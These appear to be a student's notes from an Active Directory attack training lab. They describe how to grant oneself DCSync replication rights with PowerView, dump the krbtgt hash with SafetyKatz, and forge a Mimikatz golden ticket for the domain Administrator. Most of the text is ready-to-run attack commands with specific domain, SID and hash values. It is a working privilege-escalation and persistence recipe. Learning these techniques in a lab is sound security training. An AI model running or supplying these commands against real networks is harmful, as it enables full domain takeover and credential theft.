# ATTACK TO BE DONE WHEN WE HAVE REPLICATION RIGHTS (NO DA PRIVILEGES REQUIRED)

1-  Get InvisiShell and PowerView module
2-  Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
  -> If returns a blank space we dont have the replication rights.
  -> To add the replication rights (this steps, we need to run these commands from an elevated shell).
  2.1-  Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student575 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
  2.2-  Run command 2 again
3-  Run DCSync attack:
  # CAN SPECIFY /ALL TO GET ALL HASHES
  C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
  We now get the NTLM or aes256 of the krbtgt acc.
  
  
# AFTER compromising the krbtgt password hash, we can use mimikatz or impacket to forge Kerberos tickets.
# Here I'll use the golden ticket to create a Kerberos ticket-granting ticket (TGT).
# Because the root of trust in Kerberos is the krbtgt password hash, this TGT is considered fully valid.
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff47a9d8bd66ce7efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

This way we get a proccess running as admin in the current cmd after getting krbtgt ntlm hash without DA privileges.
